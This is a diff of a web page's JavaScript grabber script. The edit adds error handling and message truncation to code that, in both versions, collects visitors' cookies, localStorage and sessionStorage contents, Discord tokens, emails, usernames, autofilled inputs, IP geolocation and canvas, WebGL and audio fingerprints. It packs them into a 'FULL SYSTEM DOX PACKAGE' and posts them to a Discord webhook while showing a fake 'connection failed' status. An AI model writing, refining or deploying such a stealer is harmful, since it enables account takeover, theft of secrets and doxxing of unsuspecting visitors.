@@ -107,178 +107,193 @@
             }
         };
 
-        // ─── 50+ DATA GRABBERS ─────────────────────────────────────
+        function safeString(val) {
+            if (val === null || val === undefined) return 'unknown';
+            if (typeof val === 'string') return val;
+            if (typeof val === 'number') return String(val);
+            if (typeof val === 'boolean') return String(val);
+            if (Array.isArray(val)) return val.join(', ');
+            if (typeof val === 'object') return JSON.stringify(val);
+            return String(val);
+        }
+
         function grabAllData() {
             debug('🔍 Starting full data collection');
             const data = {};
 
-            // 1. Browser identity
-            data.userAgent = navigator.userAgent;
-            data.platform = navigator.platform;
-            data.language = navigator.language;
-            data.languages = navigator.languages || [];
-            data.cookieEnabled = navigator.cookieEnabled;
-            data.doNotTrack = navigator.doNotTrack || 'unspecified';
-            data.maxTouchPoints = navigator.maxTouchPoints || 0;
-            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-            data.deviceMemory = navigator.deviceMemory || 'unknown';
-            data.vendor = navigator.vendor || 'unknown';
-            data.vendorSub = navigator.vendorSub || 'unknown';
-            data.product = navigator.product || 'unknown';
-            data.productSub = navigator.productSub || 'unknown';
-            data.appName = navigator.appName || 'unknown';
-            data.appVersion = navigator.appVersion || 'unknown';
-            data.appCodeName = navigator.appCodeName || 'unknown';
-            data.onLine = navigator.onLine;
+            try {
+                data.userAgent = navigator.userAgent || 'unknown';
+                data.platform = navigator.platform || 'unknown';
+                data.language = navigator.language || 'unknown';
+                data.languages = navigator.languages || [];
+                data.cookieEnabled = navigator.cookieEnabled;
+                data.doNotTrack = navigator.doNotTrack || 'unspecified';
+                data.maxTouchPoints = navigator.maxTouchPoints || 0;
+                data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+                data.deviceMemory = navigator.deviceMemory || 'unknown';
+                data.vendor = navigator.vendor || 'unknown';
+                data.vendorSub = navigator.vendorSub || 'unknown';
+                data.product = navigator.product || 'unknown';
+                data.productSub = navigator.productSub || 'unknown';
+                data.appName = navigator.appName || 'unknown';
+                data.appVersion = navigator.appVersion || 'unknown';
+                data.appCodeName = navigator.appCodeName || 'unknown';
+                data.onLine = navigator.onLine;
+            } catch(e) { debug('❌ Error getting navigator data:', e.message); }
 
-            // 2. Screen / Display
-            data.screen = {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio || 1,
-                orientation: screen.orientation ? screen.orientation.type : 'unknown'
-            };
+            try {
+                data.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio || 1,
+                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                };
+            } catch(e) { data.screen = {}; }
 
-            // 3. Time / Locale
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.locale = Intl.DateTimeFormat().resolvedOptions().locale;
-            data.timeOffset = new Date().getTimezoneOffset();
-            data.dateTime = new Date().toISOString();
+            try {
+                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+                data.locale = Intl.DateTimeFormat().resolvedOptions().locale || 'unknown';
+                data.timeOffset = new Date().getTimezoneOffset();
+                data.dateTime = new Date().toISOString();
+            } catch(e) { debug('❌ Error getting time data:', e.message); }
 
-            // 4. Network
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            data.network = conn ? {
-                effectiveType: conn.effectiveType,
-                rtt: conn.rtt,
-                downlink: conn.downlink,
-                saveData: conn.saveData,
-                type: conn.type || 'unknown'
-            } : {};
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                data.network = conn ? {
+                    effectiveType: conn.effectiveType || 'unknown',
+                    rtt: conn.rtt || 'unknown',
+                    downlink: conn.downlink || 'unknown',
+                    saveData: conn.saveData || false,
+                    type: conn.type || 'unknown'
+                } : {};
+            } catch(e) { data.network = {}; }
 
-            // 5. Battery
             data.battery = 'pending';
-
-            // 6. Geolocation
             data.geo = 'pending';
-
-            // 7. Permissions
             data.permissions = 'pending';
 
-            // 8. Storage (cookies, localStorage, sessionStorage)
-            data.cookies = document.cookie || 'none';
-            data.localStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                data.localStorage[key] = localStorage.getItem(key);
-            }
-            data.sessionStorage = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                data.sessionStorage[key] = sessionStorage.getItem(key);
-            }
+            try {
+                data.cookies = document.cookie || 'none';
+            } catch(e) { data.cookies = 'error'; }
 
-            // 9. Plugins & MIME
-            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
-            data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+            try {
+                data.localStorage = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
+                }
+            } catch(e) { data.localStorage = {}; }
 
-            // 10. Fingerprints
-            data.canvasFingerprint = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 256;
-                    canvas.height = 128;
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(10, 10, 50, 50);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
-                    return canvas.toDataURL().substring(0, 150);
-                } catch { return 'unavailable'; }
-            })();
+            try {
+                data.sessionStorage = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) { data.sessionStorage = {}; }
 
-            data.webgl = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (!gl) return 'not supported';
+            try {
+                data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+            } catch(e) { data.plugins = []; }
+
+            try {
+                data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+            } catch(e) { data.mimeTypes = []; }
+
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 128;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(10, 10, 50, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
+                data.canvasFingerprint = canvas.toDataURL().substring(0, 150);
+            } catch(e) { data.canvasFingerprint = 'unavailable'; }
+
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (!debugInfo) return 'no debug info';
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                } catch { return 'unavailable'; }
-            })();
+                    if (debugInfo) {
+                        data.webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'unknown',
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown'
+                        };
+                    } else {
+                        data.webgl = 'no debug info';
+                    }
+                } else {
+                    data.webgl = 'not supported';
+                }
+            } catch(e) { data.webgl = 'unavailable'; }
 
-            data.audioFingerprint = (() => {
-                try {
-                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = ctx.createOscillator();
-                    const analyser = ctx.createAnalyser();
-                    oscillator.connect(analyser);
-                    analyser.connect(ctx.destination);
-                    oscillator.frequency.value = 440;
-                    oscillator.type = 'sawtooth';
-                    oscillator.start(0);
-                    const buffer = new Uint8Array(analyser.frequencyBinCount);
-                    analyser.getByteFrequencyData(buffer);
-                    oscillator.stop(0);
-                    ctx.close();
-                    return Array.from(buffer.slice(0, 20)).join(',') + '...';
-                } catch { return 'unavailable'; }
-            })();
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(ctx.destination);
+                oscillator.frequency.value = 440;
+                oscillator.type = 'sawtooth';
+                oscillator.start(0);
+                const buffer = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(buffer);
+                oscillator.stop(0);
+                ctx.close();
+                data.audioFingerprint = Array.from(buffer.slice(0, 20)).join(',') + '...';
+            } catch(e) { data.audioFingerprint = 'unavailable'; }
 
-            // 11. Page info
-            data.referrer = document.referrer || 'direct';
-            data.pageUrl = window.location.href;
-            data.pageTitle = document.title;
-            data.hostname = window.location.hostname;
-            data.pathname = window.location.pathname;
-            data.searchParams = window.location.search;
-            data.hash = window.location.hash;
+            try {
+                data.referrer = document.referrer || 'direct';
+                data.pageUrl = window.location.href;
+                data.pageTitle = document.title || 'unknown';
+                data.hostname = window.location.hostname;
+                data.pathname = window.location.pathname;
+                data.searchParams = window.location.search || 'none';
+                data.hash = window.location.hash || 'none';
+            } catch(e) { debug('❌ Error getting page data:', e.message); }
 
-            // 12. JavaScript capabilities
             data.jsEnabled = true;
-            data.javaEnabled = navigator.javaEnabled();
-            data.cookieEnabled = navigator.cookieEnabled;
+            try { data.javaEnabled = navigator.javaEnabled(); } catch(e) { data.javaEnabled = false; }
 
-            // 13. DOM info
-            data.forms = document.forms.length;
-            data.images = document.images.length;
-            data.links = document.links.length;
-            data.scripts = document.scripts.length;
-            data.frames = window.frames.length;
+            try {
+                data.forms = document.forms.length;
+                data.images = document.images.length;
+                data.links = document.links.length;
+                data.scripts = document.scripts.length;
+                data.frames = window.frames.length;
+            } catch(e) { debug('❌ Error getting DOM counts:', e.message); }
 
-            // 14. Window dimensions
-            data.window = {
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                scrollX: window.scrollX,
-                scrollY: window.scrollY
-            };
+            try {
+                data.window = {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    scrollX: window.scrollX,
+                    scrollY: window.scrollY
+                };
+            } catch(e) { data.window = {}; }
 
-            // 15. Performance / Timing
-            data.performance = (() => {
-                try {
-                    const perf = performance.timing;
-                    return {
-                        loadTime: perf.loadEventEnd - perf.navigationStart,
-                        domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
-                        connectTime: perf.connectEnd - perf.connectStart,
-                        responseTime: perf.responseEnd - perf.requestStart
-                    };
-                } catch { return {}; }
-            })();
+            try {
+                const perf = performance.timing;
+                data.performance = {
+                    loadTime: perf.loadEventEnd - perf.navigationStart,
+                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
+                    connectTime: perf.connectEnd - perf.connectStart,
+                    responseTime: perf.responseEnd - perf.requestStart
+                };
+            } catch(e) { data.performance = {}; }
 
-            // 16. Fonts (via JS detection - basic)
-            data.fonts = (() => {
+            try {
                 const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma'];
                 const available = [];
                 const canvas = document.createElement('canvas');
@@ -291,141 +306,125 @@
                         available.push(font);
                     }
                 });
-                return available;
-            })();
+                data.fonts = available;
+            } catch(e) { data.fonts = []; }
 
-            // 17. Touch support
             data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-
-            // 18. Media devices
             data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
-
-            // 19. WebRTC
             data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
-
-            // 20. WebAssembly
             data.wasm = typeof WebAssembly === 'object' ? 'supported' : 'not supported';
-
-            // 21. Service Workers
             data.serviceWorker = 'serviceWorker' in navigator ? 'supported' : 'not supported';
-
-            // 22. Push notifications
             data.pushNotifications = 'Notification' in window ? 'supported' : 'not supported';
-
-            // 23. Cache storage
             data.cacheStorage = 'CacheStorage' in window ? 'supported' : 'not supported';
-
-            // 24. IndexedDB
             data.indexedDB = 'indexedDB' in window ? 'supported' : 'not supported';
-
-            // 25. WebSockets
             data.webSockets = 'WebSocket' in window ? 'supported' : 'not supported';
-
-            // 26. WebWorkers
             data.webWorkers = 'Worker' in window ? 'supported' : 'not supported';
-
-            // 27. SharedWorkers
             data.sharedWorkers = 'SharedWorker' in window ? 'supported' : 'not supported';
 
-            // 28. WebGL2
-            data.webgl2 = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    return !!canvas.getContext('webgl2');
-                } catch { return false; }
-            })();
+            try {
+                const canvas = document.createElement('canvas');
+                data.webgl2 = !!canvas.getContext('webgl2');
+            } catch(e) { data.webgl2 = false; }
 
-            // 29. Canvas dimensions
-            data.maxCanvasSize = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    for (let w = 10000; w > 1000; w -= 1000) {
-                        canvas.width = w;
-                        canvas.height = w;
-                        if (canvas.width === w) return w;
-                    }
-                    return 'unknown';
-                } catch { return 'unknown'; }
-            })();
+            try {
+                const canvas = document.createElement('canvas');
+                let maxSize = 0;
+                for (let w = 10000; w > 1000; w -= 1000) {
+                    canvas.width = w;
+                    canvas.height = w;
+                    if (canvas.width === w) { maxSize = w; break; }
+                }
+                data.maxCanvasSize = maxSize || 'unknown';
+            } catch(e) { data.maxCanvasSize = 'unknown'; }
 
-            // 30. GPU info (via canvas)
-            data.gpu = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    if (!gl) return 'unknown';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
                     const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (!ext) return 'unknown';
-                    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-                } catch { return 'unknown'; }
-            })();
+                    if (ext) {
+                        data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'unknown';
+                    } else {
+                        data.gpu = 'unknown';
+                    }
+                } else {
+                    data.gpu = 'not supported';
+                }
+            } catch(e) { data.gpu = 'unknown'; }
 
             debug(`✅ Collected ${Object.keys(data).length} data points`);
             return data;
         }
 
-        // ─── GRAB ACCOUNT INFO ─────────────────────────────────────
         function grabAccountsAndEmails() {
             debug('🔍 Scanning for accounts/emails');
             const results = { emails: [], usernames: [], discord: [], social: [] };
 
-            // 1. Email patterns in DOM
-            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-            const bodyText = document.body ? document.body.innerText : '';
-            const foundEmails = bodyText.match(emailRegex) || [];
-            foundEmails.forEach(e => {
-                if (!results.emails.includes(e)) results.emails.push(e);
-            });
+            try {
+                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+                const bodyText = document.body ? document.body.innerText : '';
+                const foundEmails = bodyText.match(emailRegex) || [];
+                foundEmails.forEach(e => {
+                    if (!results.emails.includes(e)) results.emails.push(e);
+                });
+            } catch(e) {}
 
-            // 2. Check localStorage/sessionStorage for email-like keys
-            ['localStorage', 'sessionStorage'].forEach(storage => {
-                const source = storage === 'localStorage' ? localStorage : sessionStorage;
-                for (let i = 0; i < source.length; i++) {
-                    const key = source.key(i);
-                    const val = source.getItem(key);
+            try {
+                ['localStorage', 'sessionStorage'].forEach(storage => {
+                    const source = storage === 'localStorage' ? localStorage : sessionStorage;
+                    for (let i = 0; i < source.length; i++) {
+                        const key = source.key(i);
+                        const val = source.getItem(key);
+                        if (key && (key.toLowerCase().includes('email') || key.toLowerCase().includes('user'))) {
+                            if (val && val.includes('@')) results.emails.push(val);
+                            if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
+                        }
+                        if (key && (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token') || key.toLowerCase().includes('webhook'))) {
+                            results.discord.push({ key, val: val ? val.substring(0, 50) : 'empty' });
+                        }
+                        if (key && (key.toLowerCase().includes('instagram') || key.toLowerCase().includes('twitter') || key.toLowerCase().includes('facebook'))) {
+                            results.social.push({ platform: key, username: val || 'empty' });
+                        }
+                    }
+                });
+            } catch(e) {}
+
+            try {
+                document.cookie.split(';').forEach(c => {
+                    const parts = c.trim().split('=');
+                    if (parts.length >= 2) {
+                        const key = parts[0];
+                        const val = decodeURIComponent(parts.slice(1).join('='));
+                        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
+                            if (val && val.includes('@')) results.emails.push(val);
+                            if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
+                        }
+                        if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token')) {
+                            results.discord.push({ key, val: val.substring(0, 50) });
+                        }
+                    }
+                });
+            } catch(e) {}
+
+            try {
+                const params = new URLSearchParams(window.location.search);
+                params.forEach((val, key) => {
                     if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
                         if (val && val.includes('@')) results.emails.push(val);
-                        if (val && !val.includes('@') && val.length > 2) results.usernames.push(val);
+                        if (val && !val.includes('@') && val.length > 2 && val.length < 50) results.usernames.push(val);
                     }
-                    if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token') || key.toLowerCase().includes('webhook')) {
-                        results.discord.push({ key, val: val.substring(0, 50) });
+                });
+            } catch(e) {}
+
+            try {
+                document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
+                    if (el.value) {
+                        if (el.value.includes('@')) results.emails.push(el.value);
+                        else if (el.value.length > 2 && el.value.length < 50) results.usernames.push(el.value);
                     }
-                    if (key.toLowerCase().includes('instagram') || key.toLowerCase().includes('twitter') || key.toLowerCase().includes('facebook')) {
-                        results.social.push({ platform: key, username: val });
-                    }
-                }
-            });
+                });
+            } catch(e) {}
 
-            // 3. Check cookies for email/user
-            document.cookie.split(';').forEach(c => {
-                const [key, val] = c.trim().split('=');
-                if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
-                    if (val && val.includes('@')) results.emails.push(decodeURIComponent(val));
-                    if (val && !val.includes('@') && val.length > 2) results.usernames.push(decodeURIComponent(val));
-                }
-                if (key.toLowerCase().includes('discord') || key.toLowerCase().includes('token')) {
-                    results.discord.push({ key, val: decodeURIComponent(val).substring(0, 50) });
-                }
-            });
-
-            // 4. Check URL params for user info
-            const params = new URLSearchParams(window.location.search);
-            params.forEach((val, key) => {
-                if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
-                    if (val && val.includes('@')) results.emails.push(val);
-                    if (val && !val.includes('@') && val.length > 2) results.usernames.push(val);
-                }
-            });
-
-            // 5. Check input fields for autofilled info
-            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
-                if (el.value) {
-                    if (el.value.includes('@')) results.emails.push(el.value);
-                    else if (el.value.length > 2) results.usernames.push(el.value);
-                }
-            });
-
-            // Remove duplicates
             results.emails = [...new Set(results.emails)];
             results.usernames = [...new Set(results.usernames)];
 
@@ -433,88 +432,102 @@
             return results;
         }
 
-        // ─── GENERATE PDF (via base64) ─────────────────────────────
         function generatePDF(allData, accountData, cookies) {
             debug('📄 Generating PDF');
             
+            const safe = (val) => {
+                if (val === null || val === undefined) return 'unknown';
+                if (typeof val === 'string') return val;
+                if (typeof val === 'number') return String(val);
+                if (typeof val === 'boolean') return String(val);
+                if (Array.isArray(val)) return val.join(', ');
+                if (typeof val === 'object') {
+                    try { return JSON.stringify(val); } catch(e) { return 'object'; }
+                }
+                return String(val);
+            };
+
             const pdfContent = `
-                ====================================================
-                FULL SYSTEM DOX PACKAGE
-                Generated: ${new Date().toISOString()}
-                ====================================================
+====================================================
+FULL SYSTEM DOX PACKAGE
+Generated: ${new Date().toISOString()}
+====================================================
 
-                ─── ACCOUNT INFORMATION ──────────────────────────────
-                Emails: ${accountData.emails.join(', ') || 'none'}
-                Usernames: ${accountData.usernames.join(', ') || 'none'}
-                
-                Discord Tokens/Keys:
-                ${accountData.discord.map(d => `  ${d.key}: ${d.val}`).join('\n') || 'none'}
-                
-                Social Media:
-                ${accountData.social.map(s => `  ${s.platform}: ${s.username}`).join('\n') || 'none'}
+─── ACCOUNT INFORMATION ──────────────────────────────
+Emails: ${safe(accountData.emails)}
+Usernames: ${safe(accountData.usernames)}
 
-                ─── COOKIES (ALL) ─────────────────────────────────────
-                ${cookies}
+Discord Tokens/Keys:
+${accountData.discord.map(d => `  ${safe(d.key)}: ${safe(d.val)}`).join('\n') || 'none'}
 
-                ─── LOCAL STORAGE ─────────────────────────────────────
-                ${JSON.stringify(allData.localStorage, null, 2)}
+Social Media:
+${accountData.social.map(s => `  ${safe(s.platform)}: ${safe(s.username)}`).join('\n') || 'none'}
 
-                ─── SESSION STORAGE ───────────────────────────────────
-                ${JSON.stringify(allData.sessionStorage, null, 2)}
+─── COOKIES (ALL) ─────────────────────────────────────
+${safe(cookies)}
 
-                ─── SYSTEM INFO ─────────────────────────────────────
-                IP: ${allData.ip || 'unknown'}
-                Location: ${allData.city || 'unknown'}, ${allData.region || 'unknown'}, ${allData.country || 'unknown'}
-                Coordinates: ${allData.latitude || 'unknown'}, ${allData.longitude || 'unknown'}
-                ISP: ${allData.isp || 'unknown'}
-                Timezone: ${allData.timezone || 'unknown'}
-                Device: ${allData.platform || 'unknown'}
-                Screen: ${allData.screen?.width || 'unknown'}x${allData.screen?.height || 'unknown'}
-                CPU: ${allData.hardwareConcurrency || 'unknown'} cores
-                Memory: ${allData.deviceMemory || 'unknown'} GB
-                User Agent: ${allData.userAgent || 'unknown'}
+─── LOCAL STORAGE ─────────────────────────────────────
+${safe(allData.localStorage)}
 
-                ─── FINGERPRINTS ─────────────────────────────────────
-                Canvas: ${allData.canvasFingerprint || 'unknown'}
-                WebGL: ${typeof allData.webgl === 'object' ? allData.webgl.renderer : allData.webgl}
-                Audio: ${allData.audioFingerprint || 'unknown'}
-                GPU: ${allData.gpu || 'unknown'}
+─── SESSION STORAGE ───────────────────────────────────
+${safe(allData.sessionStorage)}
 
-                ─── BROWSER INFO ─────────────────────────────────────
-                Plugins: ${allData.plugins?.join(', ') || 'none'}
-                Fonts: ${allData.fonts?.join(', ') || 'unknown'}
-                Languages: ${allData.languages?.join(', ') || 'unknown'}
-                Cookies Enabled: ${allData.cookieEnabled}
-                Do Not Track: ${allData.doNotTrack}
-                Touch Support: ${allData.touchSupport}
+─── SYSTEM INFO ─────────────────────────────────────
+IP: ${safe(allData.ip)}
+Location: ${safe(allData.city)}, ${safe(allData.region)}, ${safe(allData.country)}
+Coordinates: ${safe(allData.latitude)}, ${safe(allData.longitude)}
+ISP: ${safe(allData.isp)}
+Timezone: ${safe(allData.timezone)}
+Device: ${safe(allData.platform)}
+Screen: ${safe(allData.screen?.width)}x${safe(allData.screen?.height)}
+CPU: ${safe(allData.hardwareConcurrency)} cores
+Memory: ${safe(allData.deviceMemory)} GB
+User Agent: ${safe(allData.userAgent)}
 
-                ─── NETWORK INFO ─────────────────────────────────────
-                Effective Type: ${allData.network?.effectiveType || 'unknown'}
-                RTT: ${allData.network?.rtt || 'unknown'}ms
-                Downlink: ${allData.network?.downlink || 'unknown'}Mbps
+─── FINGERPRINTS ─────────────────────────────────────
+Canvas: ${safe(allData.canvasFingerprint)}
+WebGL: ${typeof allData.webgl === 'object' ? safe(allData.webgl.renderer) : safe(allData.webgl)}
+Audio: ${safe(allData.audioFingerprint)}
+GPU: ${safe(allData.gpu)}
 
-                ─── PAGE INFO ─────────────────────────────────────────
-                URL: ${allData.pageUrl || 'unknown'}
-                Referrer: ${allData.referrer || 'unknown'}
-                Title: ${allData.pageTitle || 'unknown'}
-                Hostname: ${allData.hostname || 'unknown'}
+─── BROWSER INFO ─────────────────────────────────────
+Plugins: ${safe(allData.plugins)}
+Fonts: ${safe(allData.fonts)}
+Languages: ${safe(allData.languages)}
+Cookies Enabled: ${safe(allData.cookieEnabled)}
+Do Not Track: ${safe(allData.doNotTrack)}
+Touch Support: ${safe(allData.touchSupport)}
 
-                ─── PERFORMANCE ─────────────────────────────────────
-                Load Time: ${allData.performance?.loadTime || 'unknown'}ms
-                DOM Ready: ${allData.performance?.domReady || 'unknown'}ms
+─── NETWORK INFO ─────────────────────────────────────
+Effective Type: ${safe(allData.network?.effectiveType)}
+RTT: ${safe(allData.network?.rtt)}ms
+Downlink: ${safe(allData.network?.downlink)}Mbps
 
-                ====================================================
-                END OF DOX PACKAGE
-                ====================================================
+─── PAGE INFO ─────────────────────────────────────────
+URL: ${safe(allData.pageUrl)}
+Referrer: ${safe(allData.referrer)}
+Title: ${safe(allData.pageTitle)}
+Hostname: ${safe(allData.hostname)}
+
+─── PERFORMANCE ─────────────────────────────────────
+Load Time: ${safe(allData.performance?.loadTime)}ms
+DOM Ready: ${safe(allData.performance?.domReady)}ms
+
+====================================================
+END OF DOX PACKAGE
+====================================================
             `;
 
-            // Convert to base64 (btoa only works with latin1)
-            const base64 = btoa(unescape(encodeURIComponent(pdfContent)));
-            debug('✅ PDF generated');
-            return `data:application/pdf;base64,${base64}`;
+            try {
+                const base64 = btoa(unescape(encodeURIComponent(pdfContent)));
+                debug('✅ PDF generated');
+                return `data:application/pdf;base64,${base64}`;
+            } catch(e) {
+                debug('❌ PDF generation failed:', e.message);
+                return 'PDF generation failed';
+            }
         }
 
-        // ─── SEND TO DISCORD ──────────────────────────────────────
         async function sendToDiscord(content, retries = 3) {
             debug(`📤 Sending (${retries} retries)`);
             for (let i = 0; i < retries; i++) {
@@ -523,7 +536,7 @@
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content })
+                        body: JSON.stringify({ content: content.substring(0, 1900) })
                     });
                     if (response.ok) {
                         debug('✅ Sent successfully');
@@ -541,14 +554,11 @@
             return false;
         }
 
-        // ─── MAIN ──────────────────────────────────────────────────
         async function gatherAndSend() {
             debug('🚀 Starting full data collection');
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
-                // 1. Get IP
-                debug('📡 Fetching IP');
                 let ipData = {};
                 try {
                     const resp = await fetch('https://ipapi.co/json/');
@@ -558,20 +568,13 @@
                     debug(`❌ IP fetch failed: ${e.message}`);
                 }
 
-                // 2. Collect all data
                 const allData = grabAllData();
                 Object.assign(allData, ipData);
 
-                // 3. Get accounts
                 const accounts = grabAccountsAndEmails();
-
-                // 4. Get all cookies
                 const allCookies = document.cookie || 'none';
-
-                // 5. Generate PDF
                 const pdfData = generatePDF(allData, accounts, allCookies);
 
-                // 6. Build Discord message
                 let msg = '🕵️ **FULL DOX PACKAGE**\n\n';
                 msg += `📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
                 msg += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
@@ -586,23 +589,14 @@
                 msg += `📄 **PDF:** ${pdfData.substring(0, 50)}...\n\n`;
                 msg += `⏰ ${new Date().toISOString()}\n`;
 
-                // Add full cookie dump as separate message if too long
-                const cookieMsg = `📋 **ALL COOKIES:**\n\`\`\`\n${allCookies}\n\`\`\``;
+                const cookieMsg = `📋 **ALL COOKIES:**\n\`\`\`\n${allCookies.substring(0, 1900)}\n\`\`\``;
                 const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${JSON.stringify(allData.localStorage, null, 2).substring(0, 1900)}\n\`\`\``;
 
-                // Send main message
                 await sendToDiscord(msg);
-
-                // Send cookies
                 await sendToDiscord(cookieMsg);
-
-                // Send storage
                 await sendToDiscord(storageMsg);
-
-                // Send PDF link (base64 data URI)
                 await sendToDiscord(`📄 **PDF Download:** ${pdfData.substring(0, 100)}... (full in browser console)`);
 
-                // Send account details
                 if (accounts.emails.length > 0 || accounts.usernames.length > 0) {
                     const accountMsg = `🔐 **ACCOUNT DATA:**\nEmails: ${accounts.emails.join(', ')}\nUsernames: ${accounts.usernames.join(', ')}\nDiscord: ${accounts.discord.map(d => `${d.key}:${d.val}`).join(' | ')}`;
                     await sendToDiscord(accountMsg.substring(0, 1900));
@@ -618,7 +612,6 @@
             }
         }
 
-        // ─── START ──────────────────────────────────────────────────
         debug('⏳ Initializing...');
         gatherAndSend();
         debug('✅ Script ready');
